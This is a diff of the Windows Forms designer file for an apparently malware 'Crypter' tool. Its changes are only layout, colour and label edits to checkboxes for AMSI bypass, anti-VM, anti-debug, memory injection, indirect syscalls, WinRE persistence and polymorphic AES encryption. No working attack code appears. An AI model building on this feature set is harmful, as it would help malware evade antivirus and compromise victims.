@@ -62,7 +62,7 @@
             // 
             this.inputfile.BackColor = System.Drawing.Color.Black;
             this.inputfile.ForeColor = System.Drawing.Color.Lime;
-            this.inputfile.Location = new System.Drawing.Point(64, 156);
+            this.inputfile.Location = new System.Drawing.Point(87, 153);
             this.inputfile.Margin = new System.Windows.Forms.Padding(6);
             this.inputfile.Name = "inputfile";
             this.inputfile.Size = new System.Drawing.Size(526, 31);
@@ -71,8 +71,8 @@
             // button1
             // 
             this.button1.BackColor = System.Drawing.Color.Black;
-            this.button1.ForeColor = System.Drawing.Color.Lime;
-            this.button1.Location = new System.Drawing.Point(602, 156);
+            this.button1.ForeColor = System.Drawing.Color.Crimson;
+            this.button1.Location = new System.Drawing.Point(625, 153);
             this.button1.Margin = new System.Windows.Forms.Padding(6);
             this.button1.Name = "button1";
             this.button1.Size = new System.Drawing.Size(130, 38);
@@ -85,7 +85,6 @@
             // 
             this.groupBox1.Controls.Add(this.processMasquerading);
             this.groupBox1.Controls.Add(this.armdotObfuscation);
-            this.groupBox1.Controls.Add(this.polymorphicAes);
             this.groupBox1.Controls.Add(this.evilbyteIndirectSyscalls);
             this.groupBox1.Controls.Add(this.winREPersistence);
             this.groupBox1.Controls.Add(this.memoryInjection);
@@ -96,6 +95,7 @@
             this.groupBox1.Controls.Add(this.amsiBypass);
             this.groupBox1.Controls.Add(this.antiDebug);
             this.groupBox1.Controls.Add(this.antiVM);
+            this.groupBox1.ForeColor = System.Drawing.Color.Crimson;
             this.groupBox1.Location = new System.Drawing.Point(64, 196);
             this.groupBox1.Margin = new System.Windows.Forms.Padding(6);
             this.groupBox1.Name = "groupBox1";
@@ -122,7 +122,7 @@
             this.armdotObfuscation.AutoSize = true;
             this.armdotObfuscation.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.armdotObfuscation.ForeColor = System.Drawing.Color.Lime;
-            this.armdotObfuscation.Location = new System.Drawing.Point(24, 200);
+            this.armdotObfuscation.Location = new System.Drawing.Point(24, 163);
             this.armdotObfuscation.Margin = new System.Windows.Forms.Padding(6);
             this.armdotObfuscation.Name = "armdotObfuscation";
             this.armdotObfuscation.Size = new System.Drawing.Size(215, 29);
@@ -134,31 +134,32 @@
             // 
             this.polymorphicAes.AutoSize = true;
             this.polymorphicAes.ForeColor = System.Drawing.Color.Lime;
-            this.polymorphicAes.Location = new System.Drawing.Point(24, 159);
+            this.polymorphicAes.Location = new System.Drawing.Point(182, 84);
             this.polymorphicAes.Margin = new System.Windows.Forms.Padding(6);
             this.polymorphicAes.Name = "polymorphicAes";
-            this.polymorphicAes.Size = new System.Drawing.Size(287, 29);
+            this.polymorphicAes.Size = new System.Drawing.Size(367, 29);
             this.polymorphicAes.TabIndex = 6;
-            this.polymorphicAes.Text = "Polymorphism (AES only)";
+            this.polymorphicAes.Text = "Polymorphic AES (works on XOR)";
             this.polymorphicAes.UseVisualStyleBackColor = true;
             // 
             // evilbyteIndirectSyscalls
             // 
             this.evilbyteIndirectSyscalls.AutoSize = true;
+            this.evilbyteIndirectSyscalls.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.evilbyteIndirectSyscalls.ForeColor = System.Drawing.Color.Lime;
-            this.evilbyteIndirectSyscalls.Location = new System.Drawing.Point(251, 200);
+            this.evilbyteIndirectSyscalls.Location = new System.Drawing.Point(248, 157);
             this.evilbyteIndirectSyscalls.Margin = new System.Windows.Forms.Padding(6);
             this.evilbyteIndirectSyscalls.Name = "evilbyteIndirectSyscalls";
-            this.evilbyteIndirectSyscalls.Size = new System.Drawing.Size(282, 29);
+            this.evilbyteIndirectSyscalls.Size = new System.Drawing.Size(250, 29);
             this.evilbyteIndirectSyscalls.TabIndex = 0;
-            this.evilbyteIndirectSyscalls.Text = "Evilbyte Indirect Syscalls";
+            this.evilbyteIndirectSyscalls.Text = "Evilbyte\'s indirect sys";
             this.evilbyteIndirectSyscalls.UseVisualStyleBackColor = true;
             // 
             // winREPersistence
             // 
             this.winREPersistence.AutoSize = true;
             this.winREPersistence.ForeColor = System.Drawing.Color.Lime;
-            this.winREPersistence.Location = new System.Drawing.Point(304, 159);
+            this.winREPersistence.Location = new System.Drawing.Point(492, 159);
             this.winREPersistence.Margin = new System.Windows.Forms.Padding(6);
             this.winREPersistence.Name = "winREPersistence";
             this.winREPersistence.Size = new System.Drawing.Size(229, 29);
@@ -169,11 +170,12 @@
             // memoryInjection
             // 
             this.memoryInjection.AutoSize = true;
+            this.memoryInjection.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.memoryInjection.ForeColor = System.Drawing.Color.Lime;
             this.memoryInjection.Location = new System.Drawing.Point(492, 116);
             this.memoryInjection.Margin = new System.Windows.Forms.Padding(6);
             this.memoryInjection.Name = "memoryInjection";
-            this.memoryInjection.Size = new System.Drawing.Size(211, 29);
+            this.memoryInjection.Size = new System.Drawing.Size(207, 29);
             this.memoryInjection.TabIndex = 12;
             this.memoryInjection.Text = "Memory Injection";
             this.memoryInjection.UseVisualStyleBackColor = true;
@@ -267,7 +269,9 @@
             // 
             this.groupBox2.Controls.Add(this.xor);
             this.groupBox2.Controls.Add(this.aes);
+            this.groupBox2.Controls.Add(this.polymorphicAes);
             this.groupBox2.Controls.Add(this.aes256);
+            this.groupBox2.ForeColor = System.Drawing.Color.Crimson;
             this.groupBox2.Location = new System.Drawing.Point(64, 449);
             this.groupBox2.Margin = new System.Windows.Forms.Padding(6);
             this.groupBox2.Name = "groupBox2";
@@ -318,7 +322,7 @@
             // button2
             // 
             this.button2.BackColor = System.Drawing.Color.Black;
-            this.button2.ForeColor = System.Drawing.Color.Lime;
+            this.button2.ForeColor = System.Drawing.Color.Crimson;
             this.button2.Location = new System.Drawing.Point(64, 574);
             this.button2.Margin = new System.Windows.Forms.Padding(6);
             this.button2.Name = "button2";
@@ -332,7 +336,7 @@
             // 
             this.pictureBox2.BackgroundImage = global::Crypter.Properties.Resources.photo_2025_05_30_21_32_58;
             this.pictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
-            this.pictureBox2.Location = new System.Drawing.Point(655, 12);
+            this.pictureBox2.Location = new System.Drawing.Point(757, 12);
             this.pictureBox2.Name = "pictureBox2";
             this.pictureBox2.Size = new System.Drawing.Size(130, 135);
             this.pictureBox2.TabIndex = 7;
@@ -361,6 +365,7 @@
             this.Controls.Add(this.groupBox1);
             this.Controls.Add(this.button1);
             this.Controls.Add(this.inputfile);
+            this.ForeColor = System.Drawing.Color.Crimson;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Margin = new System.Windows.Forms.Padding(6);
             this.Name = "FrmCrypter";
